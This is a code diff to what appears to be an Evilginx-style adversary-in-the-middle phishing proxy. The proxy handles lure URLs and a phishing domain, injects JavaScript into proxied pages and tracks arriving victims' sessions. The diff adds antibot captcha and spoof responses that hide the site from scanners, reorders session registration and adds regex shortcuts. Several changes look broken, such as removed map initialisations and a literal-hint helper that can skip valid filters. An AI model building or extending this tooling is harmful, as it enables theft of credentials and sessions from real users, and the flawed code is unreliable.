@@ -178,9 +178,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		}
 	}
 
-	p.cookieName = strings.ToLower(GenRandomString(8)) // TODO: make cookie name identifiable
-	p.sessions = make(map[string]*Session)
-	p.sids = make(map[string]int)
+	if p.cookieName == "" {
+		p.cookieName = strings.ToLower(GenRandomString(8))
+	}
+	if err := p.cfg.Save(); err != nil {
+		log.Warning("config: failed to persist cookie name: %v", err)
+	}
 
 	// Initialize Signals & AntibotEngine
 	ipSignal, _ := signals.NewIPSignal(bl.GetPath(), wl.GetPath())
@@ -190,7 +193,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	if cfg.GetTrafficShapingConfig() != nil && cfg.GetTrafficShapingConfig().Enabled {
 		// Assuming we adapt traffic shaper config down the line
 		rateSignal = signals.NewTrafficShaper(cfg.GetTrafficShapingConfig())
-		log.Info("Traffic shaping system initialized via rate signal")
+		if err := rateSignal.Start(); err != nil {
+			log.Error("traffic shaper: failed to start: %v", err)
+		} else {
+			log.Info("Traffic shaping system started via rate signal")
+		}
 	}
 
 	tlsSignal := signals.NewTLSSignal()
@@ -261,6 +268,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if verdict.Action == "spoof" && p.spoofManager != nil {
 						r, resp := p.spoofManager.ServeSpoofResponse(req)
 						return r, resp
+					}
+					if verdict.Action == "captcha" && p.captchaManager != nil && p.captchaManager.IsEnabled() {
+						captchaHTML := p.captchaManager.GetCaptchaHTML()
+						if captchaHTML != "" {
+							page := "<html><head><title>Security Check</title></head><body>" + captchaHTML + "</body></html>"
+							resp := goproxy.NewResponse(req, "text/html", http.StatusOK, page)
+							return req, resp
+						}
 					}
 					// Default to block
 					r, resp := p.blockRequest(req)
@@ -516,18 +531,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 							create_session = false
 							req_ok = true
-							/*
-								ps.SessionId, ok = p.getSessionIdByIP(remote_addr, req.Host)
-								if ok {
-									create_session = false
-									ps.Index, ok = p.sids[ps.SessionId]
-								} else {
-									log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
-								}*/
 						}
 					}
 
-					if create_session /*&& !p.isWhitelistedIP(remote_addr, pl.Name)*/ { // TODO: always trigger new session when lure URL is detected (do not check for whitelisted IP only after this is done)
+					if create_session {
 						// session cookie not found
 						if !p.cfg.IsSiteHidden(pl_name) {
 							if l != nil {
@@ -583,15 +590,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									p.session_mtx.Lock()
 									sid := p.last_sid
 									p.last_sid += 1
+									p.sessions[session.Id] = session
+									p.sids[session.Id] = sid
 									p.session_mtx.Unlock()
 
 									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
 									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
-
-									p.session_mtx.Lock()
-									p.sessions[session.Id] = session
-									p.sids[session.Id] = sid
-									p.session_mtx.Unlock()
 
 									rid, ok := session.Params["rid"]
 									if ok && rid != "" {
@@ -1372,10 +1376,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										replace_s = strings.Replace(replace_s, "{domain_regexp}", regexp.QuoteMeta(phishDomain), -1)
 									}
 
-									if re, err := regexp.Compile(re_s); err == nil {
-										body = []byte(re.ReplaceAllString(string(body), replace_s))
-									} else {
-										log.Error("regexp failed to compile: `%s`", sf.regexp)
+									// Fast-path: extract a literal hint from the filter and skip regex if body cannot match
+									hint := extractLiteralHint(sf.regexp)
+									if hint == "" || bytes.Contains(body, []byte(hint)) {
+										if re, err := regexp.Compile(re_s); err == nil {
+											body = []byte(re.ReplaceAllString(string(body), replace_s))
+										} else {
+											log.Error("regexp failed to compile: `%s`", sf.regexp)
+										}
 									}
 								}
 							}
@@ -1668,6 +1676,10 @@ func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Re
 }
 
 func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url string) []byte {
+	// Fast-path: skip regex if </body> not present in any case
+	if !bytes.Contains(body, []byte("</body")) && !bytes.Contains(body, []byte("</BODY")) {
+		return body
+	}
 	js_nonce_re := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
 	m_nonce := js_nonce_re.FindStringSubmatch(string(body))
 	js_nonce := ""
@@ -1687,6 +1699,31 @@ func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url
 	return ret
 }
 
+
+// extractLiteralHint returns the longest static substring from a regex pattern.
+// Used as a fast-path: if the hint is absent from the haystack, the regex cannot match.
+func extractLiteralHint(pattern string) string {
+	best := ""
+	current := ""
+	for i := 0; i < len(pattern); i++ {
+		c := pattern[i]
+		if c == '.' || c == '*' || c == '+' || c == '?' || c == '[' || c == '(' || c == '{' || c == '|' || c == '\\' || c == '$' || c == '^' {
+			if len(current) > len(best) {
+				best = current
+			}
+			current = ""
+		} else {
+			current += string(c)
+		}
+	}
+	if len(current) > len(best) {
+		best = current
+	}
+	if len(best) < 3 {
+		return "" // too short to be useful as a hint
+	}
+	return best
+}
 func (p *HttpProxy) isForwarderUrl(u *url.URL) bool {
 	vals := u.Query()
 	for _, v := range vals {
